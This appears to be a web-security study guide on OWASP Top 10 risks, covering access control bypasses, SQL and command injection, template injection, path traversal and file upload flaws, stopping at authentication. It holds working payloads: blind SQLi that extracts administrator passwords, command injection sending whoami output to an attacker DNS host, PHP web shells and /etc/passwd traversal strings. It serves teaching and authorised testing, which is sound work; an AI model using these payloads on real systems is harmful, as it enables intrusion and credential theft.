---
title: "OWASP Top 10 Web Application Vulnerabilities"
slug: "owasp-top-10"
date: "2026-02-20"
category: "Web Security"
tags: ["Web Security", "OWASP Top 10", "VAPT", "SQLi", "XSS", "CSRF", "SSTI", "SSRF"]
owasp: ["A01:2021-Broken Access Control", "A02:2021-Cryptographic Failures", "A03:2021-Injection", "A04:2021-Insecure Design", "A05:2021-Security Misconfiguration", "A06:2021-Vulnerable and Outdated Components", "A07:2021-Identification and Authentication Failures", "A08:2021-Software and Data Integrity Failures", "A09:2021-Security Logging and Monitoring Failures", "A10:2021-Server-Side Request Forgery"]
red: "I manipulated parameters, bypassed access controls, and injected SQL and command payloads into web applications."
blue: "I enforced server-side authorization checks, parameterized database queries, and validated all user inputs."
summary: "Comprehensive analysis of the OWASP Top 10 security risks: Broken Access Control, Cryptographic Failures, SQL and Command Injection, SSRF, SSTI, and defensive mitigations."
wordCount: 15021
readingTimeMinutes: 75
---


## **Owasp**

**Open Web Application Security Project**

OWASP Top 10 is a regularly updated report which shows the security concerns for Web Application Security, focusing on top 10 risks.


## **Broken Access Control**

- Access control restrics the user to access the data of the other users.
- **Example ** Suppose I am a non-admin user but anyhow if I can access the data which only admin can access, it shows that the access control is broken here.
- This above situation is called the **Broken Access Control**.
**Vertical Privilege Escalation: **If a user can gain access to functionality that they are not permitted to access then this is vertical privilege escalation.

**Direct URL Access**

**Example:**

/admin

- Also check: robots.txt
- Javascript Files
- Backup Files
**Role-based Access Control Bypass (RBAC Failure)**

- If app checks: roleid=2.
- And this value is coming from: hidden field
- JSON Body
- Cookie
- URL Parameter
- Then modify it.
**Example:**

roleid1  roleid2

**Platform misconfiguration**

- If an application or a website, block the sensitive URLs like : /admin.
- It is possible that the restriction is only implemented at:
- Front-end proxy
- Load balancer
- Reverse proxy
- **OR **the client side
- But the backend still process the request.
**Example:**

If direct access to: GET /admin returns blocked/forbidden.

Try sending: GET / and header: X-Original-URL: /admin

Now if the admin panel loads, the access control is broken.

This is because the front end blocks **/admin**, but the backend trusts**X-Original-URL **header

- Also we can try for **X-Rewrite-URL: /admin**
**Another Case:**

- Admin functionality allowed only via: POST /admin
- But blocked for: GET /admin
- Or sometimes:
- POST blocked

```bash
GET allowed
```

- PUT allowed
- PATCH allowed
If access control is tied to method instead of proper authorization → it’s broken.

**Example:**

If this request as a normal user returns forbidden:

POST /admin/**UpdateRole**

Then try the different HTTP Methods like: GET, PUT, PATCH

**Horizontal Privilege Escalation: ** If a user is able to gain access to resources belonging to another user, instead of their own resources of that type.

**For example**: If an employee can access the records of other employees as well as their own, then this is horizontal privilege escalation.

**Example:**

A user might access their own account page using the following URL:

https://insecure-website.com/myaccount?id=123

If an attacker modifies the id parameter value to that of another user, they might gain access to another user's account page, and the associated data and functions.

This is an example of an **Insecure Direct Object Reference** *(IDOR)* vulnerability.

In some other cases, we can also use the **Burpsuite Repeater **to change the usernames and find the useful information.

And also some application might use the **GUIDs **** Globally Unique Identifiers **to identify users.

**Horizontal to Vertical Privilege Escalation:** If an attacker is doing a horizontal privilege escalation and compromises someone’s account. But if he attacks and compromises the administrative user account, then they can gain administrative access and hence did the **Vertical Privilege Escalation.**

**Access Control Vulnerabilities in Multi-Step Process: **

- Some application perform sensitive actions using multiple steps, like:
- Verify if user is admin.
- Then perform sensitive action, like: *change role, delete user, etc…*
- This happen if *access control is checked only at the first step.*
- *Second step doesn’t verify authorization.*
**Example:**

Admin role change might look like this: GET /admin/change-role?user=carlos

Then system verifies admin access:POST /admin/change-rolerole=adminuser=carlos

If the attacker directly sends the step 2 request, the role may change without the admin rights.

**Testing Workflow**

**First understand the application:**

- Look for important areas like:
- Login/Register
- Profile
- Settings
- Admin Panel
- APIs

```sql
Update/Delete actions
```

**Try accessing restricted pages directly:**

- Example:
- /admin
- /admin-panel
- /dashboard
- /manage
- Also check:
- robots.txt
- sitemap.xml
- javascript files
- backup files
**Test IDOR (change IDs)**

- Look for parameters like:

```bash
id
```

- userid
- accountid
- orderid
- profileid
- Example:
- /account?id=123
- Change it:

```bash
Id=124
```


```bash
Id=122
```

**Look at requests in BURP**

- Example:
- role=1
- isadmin=false
- admin=false
- Try modifying them:
- role=2
- isadmin=true
- admin=true
- Check in:
- URL Parameters
- JSON Body
- Hidden fields
**Check Cookies**

- Look at cookies like:
- role=user
- admin=false
- Try changing them into:
- role=admin
- admin=true
**Change HTTP method**

- If request blocked:
- POST /admin/updateRole
- Try:

```bash
GET
```

- PUT
- PATCH

```sql
DELETE
```

**Try Header Bypass**

- Add headers like:
- X-Original-URL: /admin
- X-Rewrite-URL: /admin
- X-Forwarded-For: 127.0.0.1
**Test Role Change Requests**

- Look for endpoints like:
- updateRole
- changeRole
- promoteUser
Try modifying role values.

- Example:
- role=user  role=admin
- roleid=1  roleid=2
**Check Multi-Step**** Processes**

- Some actions require multiple steps.
- Example:
- Verify admin
- Perform action
- Try sending only the final request.
**Test Horizontal Access**

- Login as user A.
- Try accessing user B resources.
- Example:
- /profile/carlos
- /order?user=456
- **Whenever you see:  **403 Forbidden
- Access Denied
- Unauthorized
Don’t stop testing.

Try:

- Changing IDs.
- Changing roles.
- Changing HTTP methods.
- Adding Headers.
- Replaying requests.
**Why Broken Access Control Happens**

- Developers rely on **frontend restrictions** instead of backend checks.
- Authorization checks are **missing or inconsistent**.
- Access control is tied to **client-side parameters** (role, userId).
- Backend trusts **user-controlled input**.

## **Injection**

**SQL Injection**

- It is a code injection technique used to modify data from the SQL databases.
- On a form or a login page, executable code is submitted where normal or ordinary data is expected. This causes the backend run that particular command, which results to:
- Gaining of admin privileges, retrieve all the server data, delete the data, all in all the data can be modified by the attacker if the SQL Injection is successful.
**Example:**

- If a student enters a student ID of 117 inside a webpage form labelled 'Please enter your student ID number'

![Evidence: owasp-top-10](owasp-top-10-image2.png)

- the resulting SQL query will look like:

```sql
SELECT * FROM students WHERE studentId = 117;
```

- Now in the above example, the attacker instead enters an SQL command or any conditional logic into the input field, like:

![Evidence: owasp-top-10](owasp-top-10-image3.png)

- Now here at the backend it will show like:

```sql
SELECT * FROM students WHERE studentId = 117** OR 1=1**;
```

- This makes the database table search for student id **117** or it tests to see if** 1=1. **As it seems, the second statement is always true.
- So as a result, the database will return all the data from the students table to the attacker.
- While entering the input on any login page which asks for a username and a password. The SQL query should look like:

```sql
SELECT** * FROM Employee WHERE username=’……’ AND password=<redacted>
```

- only a **-- **can give the same result, as this symbol is of commenting the further part.
- On the block of username we can write = admin’ –

```sql
SELECT * FROM Employee WHERE username=’**admin**’* *-- AND password=<redacted>
```

**How an SQL Injection works:**

User Input **→** Application **→** SQL Query **→** Database

**Basic SQLi testing inputs:**

Testers usually try this first to check for an SQL injection:

- ‘
- “
- ‘ OR ‘1’=’1

```sql
1 OR 1=1
```

- admin’ --
Purpose:

- **‘**  Breaks query and checks for SQL error.
- **“ ** Same test for double quoted queries.
- **OR 1=1**  Make condition always true.
- **admin’ --**  Comment out rest of query (login bypass).
**Types of SQL Injection:**

- **Authentication Bypass**
- admin’ –
- **Boolean-based injection**

```sql
1 OR 1=1
```

- **Error-based SQLi**
- Database errors reveal information.

```sql
Union-based SQLi
```

- Using *UNION SELECT *to retrive data from other tables.

```sql
Union-based SQLi in detail:
```


```sql
Union** only works when both the queries returns the **same** number of columns.
```

- Like: SELECT name, price FROM productsUNIONSELECT username, password FROM users
- To determine that, there are two methods in it:
Method – 1: ORDER BY

- Asking the database, to sort the results by column number.
- Increase the number until it breaks:
**Example:**


## ‘ Order By 1--


## ‘ Order By 2--


## ‘ Order By 3--


## ‘ Order By 4--


## ‘ Order By 5--

Here if, **ORDER BY 1** to **ORDER BY 4** works and **ORDER BY 5** gives error.

Then it means, This table has **4 columns.**

Method – 2: UNION SELECT NULL

- Here we will guess the number of columns using NULL values.
- Because NULL works with every datatype.
**Example:**


## ‘ Union Select Null--


## ‘ Union Select Null, Null--


## ‘ Union Select Null, Null, Null--


## ‘ Union Select Null, Null, Null, Null--

Here, the first three doesn’t work (gives error).

But the fourth one works, it means there are **4 columns.**

- After finding the number of columns, we can test each column if it can hold a string data.
**Example:**

‘ UNION SELECT ‘a’, NULL, NULL, NULL--

‘ UNION SELECT NULL, ‘a’, NULL, NULL--

‘ UNION SELECT NULL, NULL, ‘a’, NULL--

‘ UNION SELECT NULL, NULL, NULL, ‘a’--

If the column datatype isn’t compatible with the string data, it will show an error.

But if the error does not occur, then the relevant column is suitable for retrieving string data.

**To Be Noted!!**

On **ORACLE, **every SELECT query must use FROM and specify a valid table. There is a builtin table in **Oracle** for this purpose named **Dual.**

So the queries should look like: ‘ UNION SELECT NULL FROM DUAL--

In **MySQL, **the double-dash (**--**) must be followed by a space, **OR** a Hash Character (**#**) can also be used alternatively.

**Examining the Database in SQL Injection attacks:**

**Querying the Database type and version:**

Database TypeQuery

Microsoft, MySQLSELECT @@version

OracleSELECT * FROM v$version

PostgreSQLSELECT version()

You can also use UNION attack with this:

‘ UNION SELECT @@version--

**To Be Noted!!**

In Oracle database, the database version is stored in a table called: v$version

Inside the table, there is a column called: Banner  contains something like: Oracle Databse 19c Enterprise Edition.

So this query: SELECT Banner FROM v$version;  *Give me the database version.*

**Listing the contents in Non-Oracle Databases:**

From **Information_schema, **we can find the table names by (telling about the SQLi case)


```sql
UNION SELECT table_name,null…(*Req columns add null further*) FROM information_schema.tables--
```

And after finding the required table name


```sql
UNION SELECT column_name,null… FROM information_schema.columns where table_name=**<Table-name>**--
```

**Listing the contents in an Oracle Database****:**

We can find the tables by:


```sql
SELECT * FROM all_tables
```

**[**Here during an SQLi in the place of *****, we have to give the column names exactly which are allowed.**]**

An example for the above condition: SELECT table_name,null FROM all_tables from dualHere **table_name **and **null **are the two columns which are allowed during a union attack and **dual **is the table used in Oracle as we have to use **from **keyword while using **select.**

We can find columns by:


```sql
SELECT * FROM all_tab_columns WHERE table_name = ‘USERS’
```

In context of an SQLi union attack (*like the last case’s example*):SELECT column_name,null FROM all_tab_columns WHERE table_name = ‘USERS’ (The table name can be anything which we find by listing the tables from the previous query)

**Retrieving multiple values within a single column**

We can get multiple values together within a single column by:

‘ UNION SELECT username || ‘~’ || password FROM users--

**||** is the string concatenation operator on Oracle.


## **Blind Sql Injection**

Blind SQLi occurs when the application is vulnerable to SQL injection, but the application does not display database query results.

So in this, we rely on application behaviour changes, like:

TRUE condition  page response changes

FALSE condition  normal response

**Types of Blind SQL Injection:**

- Boolean-based Blind SQLi:
- Application response changes depending on the TRUE or FALSE condition.
- **Example: **‘ AND 1=1--                      ‘ AND 1=2--
**Meaning: **1=1  TRUE                                  1=2  FALSE

- Time-based Blind SQLi:
- Application delays response when the condition is TRUE.
- **Example(MySQL): **‘ AND SLEEP(5) --
Condition  ‘ AND IF(1=1,SLEEP(5),0) --

**Meaning: **TRUE  delay                                  FALSE  No delay

**Extracting String Data:**

Using SUBSTRING()

**Syntax: **SUBSTRING(column, position, length)

**Example: **SUBSTRING(password, 1, 1)

It means: First character of Password.

**Character Testing Logic:**

Condition: ‘ AND SUBSTRING(password, 1, 1)=’a’ --

That means  first character is **a** or not.

If condition is TRUE then the response changes and if not then the response is normal.

After that test for other characters like **‘b’, ‘c’, ‘d’, ……**

**Extracting Data step-by-step:**

General format: ‘ AND SUBSTRING(column, position, 1)=’character’ --

**Example: **

SUBSTRING(password, 1, 1)

SUBSTRING(password, 2, 1)

SUBSTRING(password, 3, 1)

SUBSTRING(password, 4, 1)

Test characters for each position until the correct one found.

We can use the **Burp Intruder **for this purpose.

**Common Functions used:**

- SUBSTRING()  Completed earlier.
- LENGTH()  Used to find the length of a value.
- **Example: **‘ AND LENGTH(password)=8 –
- ASCII()  Used to compare character values.
- **Example: **‘ AND ASCII(SUBSTRING(password, 1, 1))=97 --
**Error-Based Boolean**

- In some applications: TRUE  no error (normal response)FALSE  error message shownOr opposite depending on the app.
- In this we force the database to **Throw error whether condition is TRUE/FALSE.**
How to force errors:

**Example****: **Division by zero: 1/0  causes error.

- So we can write: CASE WHEN *condition *THEN 1/0 ELSE 1 END
- This means: TRUE  error
FALSE  normal

- General pattern:
‘ AND (SELECT CASE WHEN *condition *THEN 1/0 ELSE 1 END) --

- Or like in some cases (like in oracle), we can try first:
‘ || (SELECT ‘’ FROM dual) || ’

- And also in oracle or to make **1/0** a string, we have to use **TO_CHAR(1/0).**
Detecting injection:

Test: ‘ AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END) --

Result: Error  condition executed.

Then: ‘ AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END) --

Result: No error.

Extracting Data:

- After this all, we can check for the specific thing is available or not.
- Like if we want administrator user we can write:
‘ || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ‘’ END FROM users WHERE username=‘administrator’) ||’ --

- Now if the administrator user is there then it will give us internal server error, otherwise the website will work normally.
- Then we can check the length of the password by:
‘ || (SELECT CASE WHEN (LENGTH(password)>1) THEN TO_CHAR(1/0) ELSE ‘’ END FROM users WHERE username=‘administrator’) ||’ --

- Here in password>1, we can check for 10, 20 according to our convinience.
- Now in the Burp Intruder:
‘ || (SELECT CASE WHEN (SUBSTR(password, 1, 1)= ‘a’) THEN TO_CHAR(1/0) ELSE ‘’ END FROM users WHERE username=‘administrator’) ||’ --

- It means, if the first character is **a, **then it will give us error otherwise it will run the website normally.
- So in the intruder, we can change **‘a’ **and **password, 1, 1** to **password, 2, 1 **and so on.
**Error-based SQLi (Visible Errors)**

- Sometimes the database error itself contains useful information.
- In this, we force the database to throw an error.
- For this, use functions that : convert / cast / process data  fail  show error.
Using CAST / TYPE Conversion:

CAST((SELECT username FROM users) AS int)

- If username = ‘administrator’, then DB try to convert string into integer which gives error.
- Like this, anyhow we get errors and try to find out some kind of useful information in the errors generated.
**SQL Injection in different contexts:**

- Some applications take input in JSON or XML format and use this to query the database.
- So these applications often look for some commons SQLi keywords within the query, and their WAFs (Web Application Firewall) then block that query.
- So we have to bypass these filters by encoding or escaping character in the prohibited keywords.
- For this, we can use the BURPSUITE’s extension named **Hackvertor.**
**Testing Workflow**


```bash
Find Injection Point:
```

- Look in: URL Parameters     POST data     Cookies     Headers
- Test: ‘           ‘’           ‘ OR 1=1--
**Check type of SQLi**

- Error Visible?  Error-based
- Response-change?  Boolean-based
- Delay?  Time-based
- No response at all?  OAST
**Add database fingerprinting**

- MySQL: SELECT @@version
- PostgreSQL: SELECT version()
- MSSQL: SELECT @@version
- Oracle: SELECT * FROM v$version

```bash
Find Number of Columns (if UNION works)
```


```sql
ORDER BY 1--ORDER BY 2--ORDER BY 3--
```


## **Or**


```sql
UNION SELECT NULL--UNION SELECT NULL,NULL--
```


```bash
Find Usable Column
```


```sql
UNION SELECT ‘a’, NULL, NULL--
```

- Look where ‘a’ appears.
**After finding columns: **


```sql
UNION SELECT table_name,NULL FROM information_schema.tables--
```


```sql
UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Extract Data (UNION)**


```sql
UNION SELECT username, password FROM users--
```

**If UNION not working **** Use Blind SQLi**

- **Boolean-Based:**
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--

→ Change 'a' through a-z, 0-9 until true response → Change ,1,1 to ,2,1 for next character

- **Time-Based (MySQL):**
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a', SLEEP(5), 0)--

→ 5 second delay = correct character

- **Time-Based (PostgreSQL):**
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--

→ 5 second delay = correct character

- **Error-Based:**
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator')))--

→ Error message reveals the data directly

*For all blind methods: - Start with position 1,1 → then 2,1 → 3,1 (moving through each character) - Use Burp Intruder to automate character brute force*

**If async/no response **** Use OAST**

Trigger DNS/HTTP request to external server.

'; exec master..xp_dirtree '//burpcollaborator.net/a'--

**Command Injection**

- Also known as **Shell Injection.**
- Basic Injection Pattern: *Original_command User_input*
- In **Command Injection: ***Original_command ; Injected_command*
**Command Separators:**

**;**Run next command.

**&**Run next command.

**&& **Run if previous success.

**|| **Run if previous fails.

The following separators only work for Unix-based system:

- **;**
- Newline (**0x0a **or** \n**)
In Unix-based systems, we can also useBacktick: “**`****” ****(` Injected command `** **)** or Dollar: **“$” ($ Injected command $ )**

**Commands to confirm injection:**

; whoami

; id

; uname -a

; echo test

**Example: **input 123; whoami

**Safe Testing: **; echo test

Now if **test** appears, Injection confirmed!

**WHY IT WORKS? ** Application builds command like:                                            stockreport.pl 381 29                                                                                        We inject:                                            381; whoami                                                                                        Final:                                            stockreport.pl 381; whoami 29

**OUTPUT ** Original Command runsInjected Command runsBoth outputs return


![Evidence: owasp-top-10](owasp-top-10-image4.png)

**Useful Commands:**

**Blind OS Command Injection:**

Same concept as that of the Blind SQLi. The application doesnot return the output from the command within its HTTP response.

Detecting Blind OS Command Injection using time delays:


```bash
ping **command can be used for this, because it lets you specify the ICMP packets to send.
```

Which enables us to control the time taken for command to run:

& ping -c 10 127.0.0.1 &

Exploiting Blind OS Command Injection by redirecting output:

- We can redirect the output from the injected command into a file that we can retrieve using the browser.
**Example: **If in a command, we want to redirect the injection in a file, we can:

*Command *& whoami > /var/www/static/output.txt

- Here we can try &&, || in case & doesn’t work. And the /var/www/static is the resource from its file system in which we can submit our output.
- We can then use browser to fetch the file, like:
https://vulnwebsite.com/output.txt


## **Or**

- We can check for anything and change its parameter, as an example:
We check for image and then change its name (123.jpg) to **output.txt**.

Exploiting blind OS command injection using out-of-band (OAST) techniques:

Using the OAST techniques, we can use an injected command that will trigger out-of-band network interaction that we control.

**Example: **& nslookup anything.web-attacker.com &

& nslookup ‘whoami’.anything.web-attacker.com &

This command causes a DNS lookup to the attacker’s domain containing the result of the **whoami ** command.

**Testing Workflow**


```bash
Find Input Points
```

URL ParametersPost DataCookiesHeaders

**Test Injection (Basic)**

; echo test ;& echo test &

If **test** appears, injection confirmed.

**If Output Visible**

Run useful commands:

; whoami; id; uname -a

**If No Output (Blind)**

Use time-delay:

; ping -c 5 127.0.0.1 ;

If delay  injection confirmed.

**Extract output via file**

; whoami > /var/www/static/output.txt ;

Then open:

/output.txt

**If file write not working**

Try different paths:

/var/www/var/www/html/tmp/

**If No-Response (Async)**

Use OAST:

; nslookup attacker.com ;; nslookup whoami.attacker.com ;

Check DNS interaction

**Try different separators (if blocked)**

;&&&||

**Server-Side Template Injection**

**TO BE NOTED!!!! ** **Use Hacktricks website to get help of its different type of payloads and different template engines.**

- User input enters template syntax.
- Template engine evaluates it.
- Attacker executes template expressions.
**Plaintext Context**

**Example: **Consider a template that contains the following code:render(‘Hello’ + username)

- Then here we can test for SSTI by requesting a URL such as:
http://something.com/?username=${7*7}

- Now if the output contains: Hello 49  Injection confirmed.
- Reason  Template executed ${7*7}
**Code Context**

**Example: **Suppose the code of the template is:greeting = getQueryParameter(‘greeting’)engine.render(“Hello {{“+greeting+”}}”, data)

- Now on the website, the URL would be like:
http://something.com/?greeting=data.username

**HTML Reflection**

- User input appears directly in page output.
**Example: **Input: name=kavy     Output: Hello kavy

- It means: Application prints input as data.No code execution.
**This matters in SSTI Testing:**

- First check: Is input just reflected? **OR **Executed inside the template?
- Test: <tag>
- Then if: Input printed    reflection (possible XSS)Input evaluated  SSTI
- **INPUT PRINTED **** REFLECTION**
- **INPUT EXECUTED **** SSTI**

## **To Be Noted!!!**

The same payload can sometimes return a successful response in more than one template language.

**Example: **{ { 7 * ’ 7 ’ } } returns 49 in **Twig** and 7777777 in **Jinja2**

**DO NOT JUMP TO CONCLUSIONS BASED ON A SINGLE SUCCESSFUL RESPONSE.**


![Evidence: owasp-top-10](owasp-top-10-image5.png)

**Basic SSTI Detection Payloads**

- Try common template syntaxes:

```text
{{7*7}}${7*7}<%=7*7%>#{7*7}
```

- If output becomes:
49

Template executed  SSTI confirmed

**Engine Identification**

- Trigger error to identify template engine.
**Example: **<%=foobar%>

- Possible Response: undefined local variable 'foobar'
- Means: Ruby ERB template engine
- Errors often reveal:
Template engineFile pathsEngine version

**After Identifying Engine**

- Search payloads for that engine.
**Example (ERB): **<%= `whoami` %>

- Replace command: id, uname -a, cat /etc/passwd
**Useful SSTI Test Payload**

- Safe Payload: {{ 7*7 }}
- Reason:
- It does not break applicationIt confirms code execution
**Testing Workflow**


```bash
Find Reflection Point
```

Look for user input in:

URL ParametersPOST bodyHeadersCookies

**Check Reflection**

Test: <tag>

**Example: **username }} {{ 7*7 }}

Result:

Input Printed  ReflectionInput Executed SSTI

**Test SSTI Payloads**

Try:


```text
{{7*7}}${7*7}<%=7*7%>#{7*7}
```

If Response: 49

SSTI Confirmed

**Identify Template Engine**

Send invalid syntax: <%=foobar%>

Check error messages.

**Fingerprint Engine**

Try engine specific payloads:

**Example: **{{ 7*7 }}

Different outputs may reveal engine.

**Exploit SSTI **

Run commands: <%= `whoami` %>

Replace command with:

iduname -a


```bash
cat /etc/passwd
```


## **Use Payloads References**

**Hacktricks SSTI****PayloadsAllTheThings SSTI**


## **Path Traversal**

- Also called **Directory Traversal.**
- By traversing the files, we can read:
Application code and dataCredentials for back-end systemsSensitive operating system files

- Imagine a website loads an image using the following HTML:
<img src=”/loadImage?filename=218.png”>

- The image files are stored on the disk in the location: /var/www/images/
- In other words, the application reads from the following file path:
/var/www/images/218.png

- Now, we can retrieve the **/etc/passwd** file from the server’s filesystem with the following URL:
https://insecureweb.com/loadimage?filename=../../../etc/passwd

- Now the application reads from the following path:
/var/www/images/../../../etc/passwd

- **../ ** this means to step up one level in the directory.
- Three consecutive **../ **means we are going to system **Root **from **/var/www/images**
- In windows, both **../ **& **..\ **are valid directory traversal sequences.
**Example: **

https://insecureweb.com/loadImage?filename=..\..\..\windows\win.ini

- Sometimes the application blocks traversal sequences but treats the supplied filename as a default working directory.
- So instead of using **../../../, **we can directly type **/etc/passwd** in the filename parameter.
- Sometimes we have to use **nested traversal sequences **also.
**Example: **In place of **../../../etc/passwd, **we have to sometimes check:

**….//….//….//etc/passwd**

- We might also have to check if the application accepts URL encoding.
- Because the web servers may strip any directory traversal sequence before passing the input to the application.
- So to bypass this, sometimes, we use URL encoding.
- So according to this  ../ results in %2e&2e%2f and %252e%252e%252f
- Various non-standard encoding like: ..%c0%af and ..%ef%bc%8f
- Sometimes, an application may require the user supplied filename to start with the expected base folder, (**/var/www/images**)
- So, we have to include the required base folder first.
**Example: **filename = /var/www/images/../../../etc/passwd

- Sometimes, the file extension is expected at the end of the user-supplied filename, such as **.png**.
- So in this case a null byte can be used before the extension to terminate the file path.
**Example: **filename = ../../../etc/passwd%00.png

**Important Files attackers try**

Linux:

/etc/passwd/etc/shadow/etc/hosts

Windows:

C:\Windows\win.iniC:\Windows\System32\drivers\etc\hosts

**Testing Workflow**


```bash
Find file path input
```

Look for parameters that load files:

Filenamefilepathimagepagedownloadtemplate

**Example: **

/loadImage?filename=218.png/download?file=report.pdf

**Test Basic Traversal**

Try: ../../../etc/passwd

**Example: **/loadImage?filename=../../../etc/passwd

If response contains: root:x:0:0  Traversal confirmed

**Increase Traversal Depth**

Sometimes more directories are needed: ../../../../../../etc/passwd

**Test Absolute Path**

If traversal blocked: /etc/passwd

**Example: **/loadImage?filename=/etc/passwd

**Test Windows Path**

..\..\..\windows\win.ini


## **Or**

..\..\..\windows\system32\drivers\etc\hosts

**Try Encoding Bypass**

If **../** filtered: %2e%2e%2f

**Example: **%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

**Try Double Encoding**

%252e%252e%252f

**Example: **%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

**Try Nested Traversal**

….//….//….//etc/passwd

Because: ….// becomes ../

**Bypass Required Base Directory**

If application requires: /var/www/images

Try: /var/www/images/../../../etc/passwd

**Bypass File Extension Requirement**

If **.png **required:

../../../etc/passwd%00.png


## **File Upload Vulnerabilities**

- Happens when web server allows user to uploads files without checking about its **name, type, contents **or **size.**
- If validaton is weak, attackers can upload **malicious files** that may lead to:
- Remote Code ExecutionStored XSSPath TraversalServer Compromise
**Basic Attack Idea**

- Upload a server **executable file** instead of a normal file.
**Example **** web shell (PHP):**

<?php system($_GET[‘cmd’]); ?>

After upload: /uploads/shell.php?cmd=whoami


## **Or**

<?php echo file_get_contents('/path/to/target/file'); ?>

**Where to look for upload vulnerability**

Profile PictureDocument UploadAvatar UploadProduct ImagesAttachmentsSupport Tickets

**How uploads usually work**

- **Example request: **POST /upload HTTP/1.1Content-Type: multipart/form-data
- **File sent like: **filename=“image.png”Content-type: image/png
- **Server then stores file in: **/uploads/image.png
**Basic File Upload Exploit**

- Upload a **web-shell.**
- **Like: **shell.php
- **Content: **<?php system($_GET[‘cmd’]); ?>
- **Then Access: **/uploads/shell.php?cmd=id
**Common Uploads Restrictions **

- Applications try to block maliciour payloads using:
File Extension FilteringMIME type checkingFile content checkingFile size limitsStorage outside web root

- These protections are often bypassable.
**Extension Filtering Bypass**

- Server blocks **.php**
- Try alternative extensions:
.php5.php7.phtml.phar


## **To Be Noted!!!**

If the server is **Apache **and there is **Upload Function**, there is a **hidden file** named **.htaccess**.

Whatever instructions are written in this file, **Apache** follows them and then that instructions are applicable to all the files and directories apache controls.

**Example: **AddType application/x-httpd-php .hmca  It tells the server to process the files ending with **.hmca **as **PHP code.**

When making .htaccess in **Burp Suite**, we also have to make sure that the **Content – Type **is  **text/plain**

**Double Extension Bypass**

- Upload:
shell.php.jpg

- If server checks only last extension incorrectly, it may still execute.
**Null Byte Bypass (Older Systems)**

shell.php%00.jpg

- Server may interpret filename as: shell.php
**MIME Type Bypass**

- Server checks: Content-Type: image/png
- Modify request in Burp: Content-Type: image/jpeg
- Do this even if file is php.
**Magic Byte Bypass**

- Server checks file signature.
- Add image header: GIF89a
**Example: **GIF89a<?php system($_GET[‘cmd’]); ?>

- Now server thinks, file is image.
- Another way to do that, is using **exiftool.**

## **Steps:**

- After installing it from its website, go to cmd and switch to the location it is located.
- Put a contents and properties of a **jpg** file into a new **php** file.
exiftool -Comment=“<?php echo ‘START’ . file_get_contents(‘/home/carlos/secret’) . ‘END’; ?>” sample.jpg -o sample.php

- Now check for the properties and details of the **sample.php **by:exiftool sample.php
- We can see that the file type here is **JPG.**
- So finally we got a **php** file behaving like a **jpg** file.
- Upload it and see its contents, the content written between **START **and **END, **is the content required.

## **Race Condition**

- When a website upload the file to its main filesystem and then remove it if it doesn’t pass the required conditions.
- This take only a **few milliseconds**, but the file stays in the server for even the few milliseconds.
- So there are chances to retrieve that file if we can catch it in that time.
- For this condition, in **Burp Repeater**, we have to make tab group in which one tab will be of **uploading** (POST) request and one will be the **retrieving **(GET) request.
- There are two options:
- **First upload, then retrieve the file** (This doesn’t do anything because the few milliseconds are gone)
- **First retrieve, then upload the file** (This can help because before uploading we are trying to retrieve the file)
- For achieving this, we have to send **parallel requests** to both the tabs (Request at same time).
This can be done by choosing the option of sending parallel requests in the **Burp Repeater **after making **tab group****.**

Try **multiple times** so that in one time the *retrieving request comes before the uploading request*.

If needed, also can **duplicate the GET request** tabs.

**File Content Validation Bypass**

- It scans file content.
- Hide payload inside valid image.
**Example:** image.php

- Add PHP after image data.
**Upload Location Issues**

- File sometimes stored in:
/uploads//images//files/

- If these directories allow execution  RCE possible.
**Path Traversal in Upload**

- Sometimes filename is used directly.
**Example: **filename=../../shell.php

- File maybe written outside upload directory.
- Or instead of **../ **, we have to do URL encoding : **..%2f**
**Overwriting Files**

- If application does not rename files.
- Upload: index.php
- May overwrite important application files.
**Stored XSS via Upload**

- Upload HTML file: evil.html
- Content: <script>alert(1)</script>
- If served directly  Stored XSS.
**Dangerous File Types**

- Always test uploading:
- .php.asp.jsp.phtml.phar.html.svg
- SVG often leads to XSS.
**Useful Test Payloads**

- Safe test: test.txt
- Then move to:
- shell.phpshell.php.jpgshell.phtml
**Useful Commands after Remote Code Execution (RCE)**

whoamiiduname -acat /etc/passwd

**Testing Workflow**


```bash
Find Upload Feature
```

Look where user can upload files:

Profile PictureAvatar UploadDocument UploadProduct ImagesAttachmentsSupport Tickets

**Capture Upload Request**

Intercept using **BurpSuite**

Check:

POST requestmultipart/form-datafilenameContent-typefile data

**Example: **POST /upload HTTP/1.1         Content-Type: multipart/form-data

File Section: filename=“image.png”  Content-Type: image/png

**Upload Normal File First**

Upload a normal file to understand the behaviour.

**Example:** Upload test.jpgThen check: Where file is stored & How it is accessed

**Example Path: **/files/avatars/test.jpg

**Try Uploading Executable File **

Test if the server allows executable files.

**Example: **shell.php

Content: <?php echo file_get_content(‘/home/carlos/secret’); ?>


## **Or**

<?php system($_GET[‘cmd’]); ?>

Then access: /files/avatars/shell.php?cmd=whoami

**If Blocked **** Test Extension Bypass**

shell.php.jpgshell.phtmlshell.php5shell.php7shell.phar

Also test case variation:shell.PHPshell.PhP

**Test MIME Bypass**

In **Burp, **modify the request:

Change: Content-Type: image/jpeg

Even if file is actually: shell.php

**Test Magic Byte Bypass**

If server checks file signature.

Add image header before payload.

**Example: **GIF89a         <?php system($_GET[‘cmd’]); ?>

Now server may treat it as an image.


## **Or **

Try to change the behaviour and content of the **PHP **file to **JPG **or **PNG **using **exiftool.**

**Check Upload Location**

After uploading, check where file is stored.

Common directories:

/uploads//images//files/

**Test Path Traversal in Filename**

If filename is used directly:

Try: filename=../../shell.php

Or encoded: filename=..%2f..%2fshell.php

**Check for Stored XSS via Upload**

Upload HTML file: evil.html

Content: <script>alert(1)</script>

If served directly  stored XSS.

**Test Race Condition**

Sometimes the server uploads file then deletes it within few milliseconds.

Try retrieving file immediately after upload using:

Burp Repeater parallel requests.


## **Broken ****Authentication**

**Authentication**

- Authentication is the process of the identity of a user.
